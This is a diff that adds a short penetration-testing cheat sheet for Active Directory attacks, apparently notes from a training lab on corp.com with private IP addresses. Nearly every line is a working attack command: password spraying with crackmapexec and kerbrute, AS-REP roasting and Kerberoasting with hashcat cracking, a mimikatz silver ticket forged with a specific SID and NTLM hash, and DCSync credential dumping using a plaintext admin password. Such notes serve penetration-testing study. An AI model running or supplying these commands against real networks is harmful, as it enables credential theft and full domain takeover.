@@ -1,0 +1,50 @@
+#Password Spray
+#Check lockout threshold
+net accounts
+#Spray attack
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+#Kerbrute
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+-------------------------------------------------------------------------------------------------------------------------
+
+#AS-REP Roasting
+#Users with preauth turn off
+impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast domain.com/ad_user
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+.\Rubeus.exe asreproast /nowrap
+
+-------------------------------------------------------------------------------------------------------------------------
+
+#KERBEROASTING
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+-------------------------------------------------------------------------------------------------------------------------
+  
+#Silver Ticket
+1. SPN password hash
+iwr -UseDefaultCredentials http://web01
+mimikatz.exe 
+privilege::debug
+sekurlsa:logonpasswords
+
+2. Domain SID
+whoami /user
+#user doamin without last 4 nums
+
+3. Target SPN
+#Target SPN
+HHTP/web04.domain.com:80
+
+4. Create Silver Ticket
+mimikatz.exe
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+
+-------------------------------------------------------------------------------------------------------------------------
+#DC Sync
+mimikatz.exe
+lsadump::dcsync /user:corp\dave
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+  
